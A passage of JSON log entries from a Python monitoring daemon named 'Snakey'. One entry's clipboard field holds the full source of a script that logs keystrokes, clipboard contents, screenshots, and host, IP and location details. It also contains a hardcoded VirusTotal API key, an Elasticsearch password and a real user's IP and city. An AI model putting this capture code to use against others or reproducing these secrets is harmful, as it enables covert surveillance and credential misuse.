{}\r\n    }\r\n\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        # Use try-except for socket.gethostbyname as it can fail in some daemon contexts\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n\r\n\r\n        # === Public IP and ISP lookup ===\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json() # Add timeout\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\r\n        except Exception as e: # Catch any other unexpected errors\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\r\n\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\r\n\r\n\r\n    # Ensure win32clipboard is available/relevant for the OS\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n            except TypeError:\r\n                session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n\r\n    # Ensure ImageGrab is available/relevant for the OS\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            screenshot_path = os.path.join(base_path, screenshot_information)\r\n            im = ImageGrab.grab()\r\n            im.save(screenshot_path)\r\n            session_log[\"screenshot_taken\"] = True\r\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(os.path.join(base_path, screenshot_information)) # Ensure correct path for VT lookup\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n        # Add special keys as strings for logging visibility (e.g., [ENTER], [SHIFT])\r\n        else:\r\n            keys.append(f\"[{str(key).replace('Key.', '')}]\")\r\n\r\n\r\n    log_daemon_message(\"INFO\", \"Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    listener = None # Initialize listener to None\r\n    try:\r\n        with Listener(on_press=on_press) as listener:\r\n            start_time = time.time()\r\n            while time.time() - start_time < 10: # Collect keystrokes for 10 seconds\r\n                time.sleep(1)\r\n                if check_stop_file():\r\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\r\n                    break\r\n            listener.stop() # Explicitly stop the listener\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Keylogger listener error: {e}. This might happen if not running in a desktop session.\")\r\n        # Attempt to stop listener if it was created\r\n        if listener:\r\n            try:\r\n                listener.stop()\r\n            except Exception as stop_e:\r\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\r\n\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    log_string_for_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n    session_log[\"log_hash\"] = hash_text(log_string_for_hash)\r\n\r\n    try:\r\n        # Load existing logs\r\n        if os.path.exists(json_log_path):\r\n            try:\r\n                with open(json_log_path, \"r\") as f:\r\n                    logs = json.load(f)\r\n            except json.JSONDecodeError:\r\n                log_daemon_message(\"WARNING\", \"Existing JSON log file is corrupt. Starting with empty log.\")\r\n                logs = []\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Log saved to JSON file.\")\r\n\r\n        # Load or initialize ledger as a list of dicts\r\n        if os.path.exists(hash_ledger_path):\r\n            try:\r\n                with open(hash_ledger_path, \"r\") as f:\r\n                    ledger = json.load(f)\r\n                if ledger and isinstance(ledger[0], str): # Handle legacy format if any\r\n                    log_daemon_message(\"INFO\", \"Converting legacy hash ledger format.\")\r\n                    ledger = [{\r\n                        \"timestamp\": \"unknown\",\r\n                        \"log_hash\": h,\r\n                        \"previous_hash\": \"0\" * 64,\r\n                        \"chained_hash\": \"0\" * 64\r\n                    } for h in ledger]\r\n            except json.JSONDecodeError:\r\n                log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\r\n                ledger = []\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash_input = session_log[\"log_hash\"] + previous_hash\r\n        chained_hash = hash_text(chained_hash_input)\r\n\r\n        ledger_entry = {\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        }\r\n\r\n        ledger.append(ledger_entry)\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated.\")\r\n\r\n        hash_list = [entry[\"log_hash\"] for entry in ledger]\r\n        merkle_root = build_merkle_tree(hash_list)\r\n\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Merkle root saved.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)\r\n\r\n        log_daemon_message(\"INFO\", f\"Sleeping for 15 seconds before next collection at {datetime.now().isoformat()}...\")\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        log_daemon_message(\"INFO\", \"Stop file removed.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "afd5f36d68abd7e05878aa105e608f2089e2aadb37ee69a0cc927fc9b2b080b3", "screenshot_hash": "f36ef067830ddf497b1348aaa3ae328c6aeee21e723c95851a976ea85860b94a", "log_hash": "29169659fc28732eef92d0008df4b0ca4c794976b7d10b856d3a9e956e48f399"}
{"timestamp": "2025-06-10T16:46:12.945824", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException\r\nimport ssl\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\ndef log_daemon_message(level, message):\r\n    timestamp = datetime.now().isoformat()\r\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\r\n    try:\r\n        with open(daemon_log_file, \"a\") as f:\r\n            f.write(log_entry)\r\n        print(log_entry.strip())\r\n    except Exception as e:\r\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\r\n        print(log_entry.strip())\r\n\r\nif not os.path.exists(key_path):\r\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\r\n    exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\r\n\r\nes_context = ssl._create_unverified_context()\r\n\r\nes_client = None\r\n\r\n# --- IMPORTANT CHANGE: Modify Elasticsearch client initialization ---\r\n# We'll use a flag to track if the pre-check succeeded, and then decide to initialize es_client.\r\n# The es_client.ping() call will be removed for simplicity if the pre-check passes.\r\nes_precheck_successful = False\r\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\ntry:\r\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD), verify=False, timeout=10, stream=True)\r\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\r\n    response.raw.read(1) # Read minimal data\r\n    response.close()\r\n    if response.status_code == 200:\r\n        log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful (status 200).\")\r\n        es_precheck_successful = True\r\n    else:\r\n        log_daemon_message(\"WARNING\", f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\")\r\n\r\nexcept requests.exceptions.ConnectionError as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\r\nexcept requests.exceptions.Timeout:\r\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\r\nexcept requests.exceptions.RequestException as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            ssl_context=es_context,\r\n            request_timeout=30\r\n        )\r\n        # Removed the es_client.ping() call here as it's the source of the problem.\r\n        # We rely on the successful pre-check and the subsequent send_to_elasticsearch to fail\r\n        # if the client isn't truly ready.\r\n        log_daemon_message(\"INFO\", \"Elasticsearch client initialized based on successful pre-check.\")\r\n    except ConnectionError as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\")\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        es_client = None\r\n    except TransportError as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\")\r\n        es_client = None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Erro inesperado ao inicializar cliente Elasticsearch: {e}\")\r\n        es_client = None\r\nelse:\r\n    log_daemon_message(\"WARNING\", \"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions (No changes needed here from previous review) ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        # VirusTotal API for file lookup requires file content, not just hash for first scan.\r\n        # But for lookup by hash, this is correct if file is already analyzed.\r\n        # For a daemon, consider if you truly want to upload files for scan or just query existing reports.\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n             log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            log_daemon_message(\"DEBUG\", f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except ConnectionError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\")\r\n        except AuthenticationException as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        except TransportError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\r\n    else:\r\n        log_daemon_message(\"WARNING\", \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\r\n\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n            except TypeError:\r\n                session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            screenshot_path = os.path.join(base_path, screenshot_information)\r\n            im = ImageGrab.grab()\r\n            im.save(screenshot_path)\r\n            session_log[\"screenshot_taken\"] = True\r\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(os.path.join(base_path, screenshot_information))\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n        else:\r\n            keys.append(f\"[{str(key).replace('Key.', '')}]\")\r\n\r\n    log_daemon_message(\"INFO\", \"Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    listener = None\r\n    try:\r\n        with Listener(on_press=on_press) as listener:\r\n            start_time = time.time()\r\n            while time.time() - start_time < 10:\r\n                time.sleep(1)\r\n                if check_stop_file():\r\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\r\n                    break\r\n            listener.stop()\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Keylogger listener error: {e}. This might happen if not running in a desktop session.\")\r\n        if listener:\r\n            try:\r\n                listener.stop()\r\n            except Exception as stop_e:\r\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    log_string_for_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n    session_log[\"log_hash\"] = hash_text(log_string_for_hash)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            try:\r\n                with open(json_log_path, \"r\") as f:\r\n                    logs = json.load(f)\r\n            except json.JSONDecodeError:\r\n                log_daemon_message(\"WARNING\", \"Existing JSON log file is corrupt. Starting with empty log.\")\r\n                logs = []\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            try:\r\n                with open(hash_ledger_path, \"r\") as f:\r\n                    ledger = json.load(f)\r\n                if ledger and isinstance(ledger[0], str):\r\n                    log_daemon_message(\"INFO\", \"Converting legacy hash ledger format.\")\r\n                    ledger = [{\r\n                        \"timestamp\": \"unknown\",\r\n                        \"log_hash\": h,\r\n                        \"previous_hash\": \"0\" * 64,\r\n                        \"chained_hash\": \"0\" * 64\r\n                    } for h in ledger]\r\n            except json.JSONDecodeError:\r\n                log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\r\n                ledger = []\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash_input = session_log[\"log_hash\"] + previous_hash\r\n        chained_hash = hash_text(chained_hash_input)\r\n\r\n        ledger_entry = {\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        }\r\n\r\n        ledger.append(ledger_entry)\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated.\")\r\n\r\n        hash_list = [entry[\"log_hash\"] for entry in ledger]\r\n        merkle_root = build_merkle_tree(hash_list)\r\n\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Merkle root saved.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)\r\n\r\n        log_daemon_message(\"INFO\", f\"Sleeping for 15 seconds before next collection at {datetime.now().isoformat()}...\")\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        log_daemon_message(\"INFO\", \"Stop file removed.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "ba28d3e914d3a4591f301f5f05a48a8efd7891d66104b46c2f9729494e0674e8", "screenshot_hash": "015d5b59dc52bf12ddc8c5fdf1c607f881497bcc598b375e29c6bcc6502581c9", "log_hash": "5f74ef19dced158ce67c17f2f067118ec3b280c370c19b9bd392ffbfef094cda"}
